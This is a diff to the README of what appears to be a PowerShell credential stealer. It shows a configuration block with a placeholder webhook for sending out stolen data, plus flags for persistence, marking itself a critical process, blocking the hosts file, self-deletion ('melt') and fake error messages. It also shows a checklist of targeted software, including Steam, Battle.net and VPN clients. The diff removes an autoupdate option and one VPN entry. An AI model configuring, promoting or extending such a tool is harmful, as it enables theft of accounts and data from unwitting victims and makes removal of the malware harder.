@@ -46,13 +46,12 @@ Moreover, the tool has robust `persistence mechanisms` to remain active on the m
 ```ps1
 $webhook = "YOUR_WEBHOOK_HERE" 
 $debug = $false
-$autoupdate = $false
 $blockhostsfile = $true
 $criticalprocess = $true
 $melt = $false
 $fakeerror = $false
 $persistence = $true
-
+$settings = $false
 ```
 
 # Requirements
@@ -109,7 +108,6 @@ $persistence = $true
     - [Steam](https://store.steampowered.com)
     - [Battle.net](https://battle.net)
 - [x] VPN Clients
-    - [Nord](https://nordvpn.com) 
     - [Proton](https://protonvpn.com)
     - [Surfshark](https://surfshark.com)
     - [OpenVPN](https://openvpn.net/client)
